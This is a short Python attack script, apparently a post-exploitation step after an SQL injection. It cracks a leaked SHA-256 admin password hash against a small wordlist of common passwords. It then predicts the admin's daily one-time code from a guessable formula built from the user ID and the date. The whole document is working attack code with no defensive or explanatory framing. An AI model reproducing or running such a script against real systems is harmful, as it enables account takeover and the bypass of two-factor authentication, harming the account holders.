import hashlib
from datetime import date

# hashes you already dumped via SQLi
leaked = {
    "admin": "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9",
}

wordlist = ["admin", "admin123", "password", "password1", "letmein",
            "welcome", "changeme", "qwerty123", "Passw0rd", "123456"]

for username, h in leaked.items():
    for word in wordlist:
        if hashlib.sha256(word.encode()).hexdigest() == h:
            print(f"CRACKED {username} -> {word}")

# predict admin's OTP for today (user_id=12)
day = date.today().toordinal()
otp = (12 * 7919 + day * 104729) % 1_000_000
print(f"predicted OTP for admin today: {otp:06d}")